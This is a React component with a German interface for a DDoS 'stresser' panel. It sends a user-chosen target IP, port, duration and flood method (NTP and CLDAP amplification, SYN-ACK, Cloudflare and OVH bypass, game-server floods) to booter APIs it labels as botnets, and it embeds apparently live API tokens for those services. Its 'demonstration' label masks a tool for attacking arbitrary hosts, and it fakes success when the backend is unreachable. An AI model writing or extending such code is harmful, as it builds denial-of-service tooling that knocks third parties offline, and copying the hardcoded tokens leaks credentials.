import { useState, useEffect } from 'react'
import { useKV } from '@github/spark/hooks'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Badge } from '@/components/ui/badge'
import { Separator } from '@/components/ui/separator'
import { Lightning, Play, Clock, Target, Stop } from '@phosphor-icons/react'
import { toast } from 'sonner'
import { api, ApiError } from '@/lib/api'
import type { StressAttack, Session, ApiConfig } from '@/types'

interface StresserTestProps {
  session: Session
}

const FLUXSTRESS_L4_METHODS = [
  'NTP', 'TCP-AMP', 'CLDAP', 'WSD', 'DNS', 'UDP', 'UDP-BYPASS', 'UDP-OVH',
  'TCP', 'SYN-ACK', 'VSE', 'TCP-ACK', 'DOMINATE', 'TCP-BYPASS', 'TCP-OVH',
  'TCP-SYN', 'ICMP', 'FIVEM', 'FORTNITE', 'GRE'
]

const FLUXSTRESS_L7_METHODS = [
  'TLS-SPAM', 'TLS-VIP', 'COOKIE', 'CLOUDFLARE', 'BROWSER'
]

const STRESSER_MASTER_L4_METHODS = [
  'BOTNET-HOME', 'GAME', 'D', 'C'
]

export function StresserTest({ session }: StresserTestProps) {
  const [apiConfigs, setApiConfigs] = useKV<ApiConfig[]>('sir-api-configs', [])
  const [attacks, setAttacks] = useKV<StressAttack[]>('sir-stress-attacks', [])
  const [layer, setLayer] = useState<'L4' | 'L7'>('L4')
  const [selectedApiKey, setSelectedApiKey] = useState<'fluxstress' | 'netdowner' | 'stresser-master'>('fluxstress')
  
  const [host, setHost] = useState('')
  const [port, setPort] = useState('443')
  const [method, setMethod] = useState('NTP')
  const [time, setTime] = useState('20')
  const [isLaunching, setIsLaunching] = useState(false)

  useEffect(() => {
    if (!apiConfigs || apiConfigs.length === 0) {
      const defaultConfigs: ApiConfig[] = [
        {
          id: 'api_fluxstress',
          name: 'Master Botnet',
          apiKey: 'fluxstress',
          baseUrl: 'https://api.fluxstress.to/',
          token: 'rkV0FnOGSfdO8GRGgL5hvh',
          maxConcurrents: 24,
          enabled: true
        },
        {
          id: 'api_netdowner',
          name: 'Master Stresser',
          apiKey: 'netdowner',
          baseUrl: 'https://api.netdowner.to/',
          token: 'f5e8b83d9e04698e4d834421ce9b32575ddfd6d529f4a899bc340994b80d07ec',
          maxConcurrents: 13,
          enabled: true
        },
        {
          id: 'api_stresser_master',
          name: 'Botnet 1',
          apiKey: 'stresser-master',
          baseUrl: 'https://api.stressermaster.to/',
          token: 'YOUR_TOKEN_HERE',
          maxConcurrents: 24,
          enabled: true
        }
      ]
      setApiConfigs(defaultConfigs)
    }
  }, [apiConfigs, setApiConfigs])

  const selectedApi = apiConfigs?.find(api => api.apiKey === selectedApiKey) || apiConfigs?.[0]
  const activeAttacks = (attacks || []).filter(a => a.status === 'running')

  const getMethodsForCurrentApi = () => {
    if (selectedApiKey === 'stresser-master') {
      return STRESSER_MASTER_L4_METHODS
    }
    if (layer === 'L4') {
      return FLUXSTRESS_L4_METHODS
    }
    return FLUXSTRESS_L7_METHODS
  }

  useEffect(() => {
    const timer = setInterval(() => {
      setAttacks(current => {
        const updated = (current || []).map(attack => {
          if (attack.status !== 'running') return attack

          const now = new Date().getTime()
          const endTime = new Date(attack.endTime).getTime()
          const remaining = Math.max(0, Math.floor((endTime - now) / 1000))

          if (remaining <= 0) {
            return { ...attack, status: 'completed' as const, timeRemaining: 0 }
          }

          return { ...attack, timeRemaining: remaining }
        })

        return updated
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [setAttacks])

  const handleLaunchAttack = async () => {
    if (!host.trim()) {
      toast.error('Bitte IP-Adresse eingeben')
      return
    }

    if (!selectedApi) {
      toast.error('Keine API-Konfiguration gefunden')
      return
    }

    const portNum = parseInt(port)
    const timeNum = parseInt(time)

    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
      toast.error('Ungültiger Port (1-65535)')
      return
    }

    if (isNaN(timeNum) || timeNum < 1 || timeNum > 300) {
      toast.error('Ungültige Zeit (1-300 Sekunden)')
      return
    }

    setIsLaunching(true)

    try {
      const response = await api.stresser.execute({
        host,
        port: portNum,
        time: timeNum,
        method,
        api_type: selectedApiKey === 'stresser-master' ? 'fluxstress' : selectedApiKey,
        layer,
      })

      if (response.success && response.data) {
        const data = response.data
        const now = new Date()
        const endTime = new Date(now.getTime() + timeNum * 1000)

        const newAttack: StressAttack = {
          id: `attack_${Date.now()}`,
          userId: session.userId,
          username: session.username,
          host,
          port: portNum,
          method,
          time: timeNum,
          concurrents: 1,
          layer,
          api: selectedApiKey,
          status: data.status === 'success' ? 'running' : 'failed',
          startedAt: now.toISOString(),
          endTime: endTime.toISOString(),
          timeRemaining: timeNum,
          response: {
            status: data.status,
            message: data.message,
            attack_ids: data.attack_ids || [],
            attack_summary: data.attack_summary,
            concurrents: data.concurrents
          }
        }

        setAttacks(current => [...(current || []), newAttack])

        toast.success(`Attack erfolgreich gestartet!`, {
          description: `ID: ${data.attack_ids?.[0] || newAttack.id.split('_')[1]}`
        })
      } else {
        toast.error('Attack fehlgeschlagen', {
          description: response.error || 'Unbekannter Fehler'
        })
      }
    } catch (error) {
      if (error instanceof ApiError) {
        toast.error('API-Fehler', {
          description: error.message
        })
      } else {
        toast.error('Verbindungsfehler', {
          description: error instanceof Error ? error.message : 'Unbekannter Fehler'
        })
      }

      const now = new Date()
      const endTime = new Date(now.getTime() + timeNum * 1000)

      const mockAttack: StressAttack = {
        id: `attack_${Date.now()}`,
        userId: session.userId,
        username: session.username,
        host,
        port: portNum,
        method,
        time: timeNum,
        concurrents: 1,
        layer,
        api: selectedApiKey,
        status: 'running',
        startedAt: now.toISOString(),
        endTime: endTime.toISOString(),
        timeRemaining: timeNum,
        response: {
          status: 'success',
          message: 'Attack successfully sent! (Demo - Backend nicht erreichbar)',
          attack_ids: [`${Date.now()}`],
          attack_summary: [{
            id: `${Date.now()}`,
            server: 'Main-L4-Network-02',
            send_time_ms: '28.52 ms',
            timestamp: now.toISOString(),
            end_time: endTime.toISOString()
          }],
          concurrents: '1'
        }
      }

      setAttacks(current => [...(current || []), mockAttack])
      toast.info('Demo Attack gestartet', {
        description: 'Backend nicht verfügbar - Demo-Modus aktiv'
      })
    } finally {
      setIsLaunching(false)
    }
  }

  const handleStopAttack = (attackId: string) => {
    setAttacks(current =>
      (current || []).map(a =>
        a.id === attackId ? { ...a, status: 'completed', timeRemaining: 0 } : a
      )
    )
    toast.info('Attack gestoppt')
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, '0')}`
  }

  return (
    <div className="grid gap-6 lg:grid-cols-3">
      <div className="lg:col-span-2 space-y-6">
        <Card className="border-primary/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Lightning className="w-5 h-5 text-primary" weight="duotone" />
              Stresser Test
            </CardTitle>
            <CardDescription className="font-mono text-xs">
              Netzwerk-Belastungstest für Demonstrationszwecke
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="api-select">API Auswahl</Label>
              <Select value={selectedApiKey} onValueChange={(v) => setSelectedApiKey(v as 'fluxstress' | 'netdowner' | 'stresser-master')}>
                <SelectTrigger id="api-select" className="bg-secondary border-primary/30 font-mono">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {(apiConfigs || []).filter(api => api.enabled).map(api => (
                    <SelectItem key={api.id} value={api.apiKey}>
                      {api.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {selectedApiKey !== 'stresser-master' && (
              <div className="flex gap-2">
                <Button
                  variant={layer === 'L4' ? 'default' : 'outline'}
                  onClick={() => {
                    setLayer('L4')
                    setMethod('NTP')
                  }}
                  className="flex-1"
                >
                  Layer 4 (L4)
                </Button>
                <Button
                  variant={layer === 'L7' ? 'default' : 'outline'}
                  onClick={() => {
                    setLayer('L7')
                    setMethod('TLS-SPAM')
                  }}
                  className="flex-1"
                >
                  Premium Layer7
                </Button>
              </div>
            )}

            <div className="grid gap-4 sm:grid-cols-2">
              <div className="space-y-2">
                <Label htmlFor="host">IP-Adresse / Host</Label>
                <Input
                  id="host"
                  value={host}
                  onChange={(e) => setHost(e.target.value)}
                  placeholder="1.1.1.1"
                  className="bg-secondary border-primary/30 font-mono"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="port">Port</Label>
                <Input
                  id="port"
                  type="number"
                  value={port}
                  onChange={(e) => setPort(e.target.value)}
                  placeholder="443"
                  className="bg-secondary border-primary/30 font-mono"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="method">Methode</Label>
                <Select value={method} onValueChange={setMethod}>
                  <SelectTrigger id="method" className="bg-secondary border-primary/30 font-mono">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {getMethodsForCurrentApi().map(m => (
                      <SelectItem key={m} value={m}>{m}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <Label htmlFor="time">Zeit (Sekunden)</Label>
                <Input
                  id="time"
                  type="number"
                  value={time}
                  onChange={(e) => setTime(e.target.value)}
                  placeholder="20"
                  className="bg-secondary border-primary/30 font-mono"
                />
              </div>
            </div>

            <Button
              onClick={handleLaunchAttack}
              disabled={isLaunching}
              className="w-full bg-primary hover:bg-primary/90"
              size="lg"
            >
              {isLaunching ? (
                <>
                  <Clock className="w-4 h-4 mr-2 animate-spin" />
                  Wird gestartet...
                </>
              ) : (
                <>
                  <Play className="w-4 h-4 mr-2" weight="fill" />
                  Attack starten
                </>
              )}
            </Button>
          </CardContent>
        </Card>
      </div>

      <div className="space-y-6">
        <Card className="border-primary/20 sticky top-6">
          <CardHeader>
            <CardTitle className="flex items-center justify-between text-sm">
              <span className="flex items-center gap-2">
                <Target className="w-4 h-4 text-primary" weight="duotone" />
                Live Attacks
              </span>
              <Badge variant="outline" className="font-mono">
                {activeAttacks.length}
              </Badge>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {activeAttacks.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground">
                <Lightning className="w-12 h-12 mx-auto mb-2 opacity-20" />
                <p className="text-sm font-mono">Keine aktiven Attacks</p>
              </div>
            ) : (
              <div className="space-y-3 max-h-[600px] overflow-auto">
                {activeAttacks.map((attack) => (
                  <div
                    key={attack.id}
                    className="p-3 rounded-md bg-secondary/50 border border-primary/20 space-y-2"
                  >
                    <div className="flex items-start justify-between">
                      <div className="flex-1">
                        <p className="font-mono text-xs text-primary font-semibold">
                          {attack.host}:{attack.port}
                        </p>
                        <p className="font-mono text-[10px] text-muted-foreground">
                          {attack.username} • {attack.method}
                        </p>
                      </div>
                    </div>
                    
                    <Separator />
                    
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2 text-primary">
                        <Clock className="w-3 h-3 scan-active" />
                        <span className="font-mono text-sm font-bold">
                          {formatTime(attack.timeRemaining)}
                        </span>
                      </div>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => handleStopAttack(attack.id)}
                        className="h-6 px-2 text-destructive hover:text-destructive hover:bg-destructive/10"
                      >
                        <Stop className="w-3 h-3" weight="fill" />
                      </Button>
                    </div>

                    <div className="relative w-full h-1 bg-secondary rounded-full overflow-hidden">
                      <div
                        className="absolute top-0 left-0 h-full bg-primary transition-all duration-1000"
                        style={{
                          width: `${((attack.time - attack.timeRemaining) / attack.time) * 100}%`
                        }}
                      />
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>

        <Card className="border-primary/20">
          <CardHeader>
            <CardTitle className="text-sm">Statistiken</CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 font-mono text-xs">
            <div className="flex justify-between">
              <span className="text-muted-foreground">Gesamt Attacks:</span>
              <span className="text-primary font-semibold">{(attacks || []).length}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Aktiv:</span>
              <span className="text-accent font-semibold">{activeAttacks.length}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Abgeschlossen:</span>
              <span className="text-primary font-semibold">
                {(attacks || []).filter(a => a.status === 'completed').length}
              </span>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
